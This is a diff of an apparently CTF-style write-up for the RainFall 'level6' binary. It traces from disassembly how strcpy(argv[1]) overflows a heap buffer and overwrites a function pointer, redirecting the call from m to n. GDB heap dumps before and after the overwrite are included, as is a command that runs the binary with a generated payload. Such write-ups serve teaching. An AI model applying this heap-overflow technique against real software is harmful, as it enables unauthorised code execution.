@@ -89,30 +89,41 @@ End of assembler dump.
 # We can see that the address of the first instruction of m is the one moved
 # in the $edx register, in the main function :
 
-0x080484a5 <+41>:	mov    $0x8048468,%edx | 0x08048468 <+0>:	push   %ebp
+0x080484a5 <+41>:	mov    $0x8048468,%edx
 
 # Then, a call to strcpy is made with two args, one located at 0xc($ebp)
 # (which corresponds to argv) and one located at 0x1c($esp) :
 
-	0x080484b0 <+52>:	mov    0xc(%ebp),%eax <== 
-	0x080484b3 <+55>:	add    $0x4,%eax 	  <== %eax = ++argv
-	0x080484b6 <+58>:	mov    (%eax),%eax <== %eax = *argv
-	0x080484b8 <+60>:	mov    %eax,%edx <== %edx = %eax
-	0x080484ba <+62>:	mov    0x1c(%esp),%eax <== %eax = malloc(0x40)
-	0x080484be <+66>:	mov    %edx,0x4(%esp) <== 0x4(%esp) = *argv[1];
-	0x080484c2 <+70>:	mov    %eax,(%esp) <== (%esp) = %eax
+	0x080484b0 <+52>:	mov    0xc(%ebp),%eax
+	0x080484b3 <+55>:	add    $0x4,%eax
+	0x080484b6 <+58>:	mov    (%eax),%eax
+	0x080484b8 <+60>:	mov    %eax,%edx
+	0x080484ba <+62>:	mov    0x1c(%esp),%eax
+	0x080484be <+66>:	mov    %edx,0x4(%esp)
+	0x080484c2 <+70>:	mov    %eax,(%esp)
 	0x080484c5 <+73>:	call   0x8048340 <strcpy@plt>
+
+       strcpy(buf, argv[1]);
 
 # Finally, a call to a certain function is made (n, as we as seen previously) :
 
-	0x080484a1 <+37>:	mov    %eax,0x18(%esp) <== var2 = malloc(4);
-	0x080484a5 <+41>:	mov    $0x8048468,%edx <==
-	0x080484aa <+46>:	mov    0x18(%esp),%eax <==
-	0x080484ae <+50>:	mov    %edx,(%eax) <== *var2 = &m;
+    0x0804849c <+32>:	call   0x8048350 <malloc@plt>
+	0x080484a1 <+37>:	mov    %eax,0x18(%esp)
+
+        var2 = malloc(4);
+
+	0x080484a5 <+41>:	mov    $0x8048468,%edx
+	0x080484aa <+46>:	mov    0x18(%esp),%eax
+	0x080484ae <+50>:	mov    %edx,(%eax)
+
+        *var2 = &m;
+
 	[...]
-	0x080484ca <+78>:	mov    0x18(%esp),%eax <==
-	0x080484ce <+82>:	mov    (%eax),%eax <==
-	0x080484d0 <+84>:	call   *%eax <== (*var2)();
+	0x080484ca <+78>:	mov    0x18(%esp),%eax
+	0x080484ce <+82>:	mov    (%eax),%eax
+	0x080484d0 <+84>:	call   *%eax
+	
+        (*var2)();
 
 # With all of this information, the answer becomes obvious.
 # The exploit is a heap buffer overflow.
@@ -125,25 +136,28 @@ End of assembler dump.
 => 0x080484d0 <+84>:	call   *%eax
 
 # Without heap buffer overflow :
-(gdb) x/24wx 0x804a000
-0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
-0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a040:	0x41414141	0x41414141	0x00000000	0x00000011
-0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9
-				^--- address of m
+
+	(gdb) x/24wx 0x804a000
+	0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
+	0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a040:	0x41414141	0x41414141	0x00000000	0x00000011
+	0x804a050:	0x08048468	0x00000000	0x00000000	0x00020fa9
+					^--- address of m
 
 # With heap buffer overflow :
-(gdb) x/24wx 0x804a000
-0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
-0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
-0x804a050:	0x08048454	0x00000000	0x00000000	0x00020fa9
-				^--- address of n
 
+	(gdb) x/24wx 0x804a000
+	0x804a000:	0x00000000	0x00000049	0x41414141	0x41414141
+	0x804a010:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a020:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a030:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a040:	0x41414141	0x41414141	0x41414141	0x41414141
+	0x804a050:	0x08048454	0x00000000	0x00000000	0x00020fa9
+					^--- address of n
+
+# A script to generate the payload is in the resources.
 # The result is :
 
 level6@RainFall:~$ ./level6 `python /tmp/payload.py`
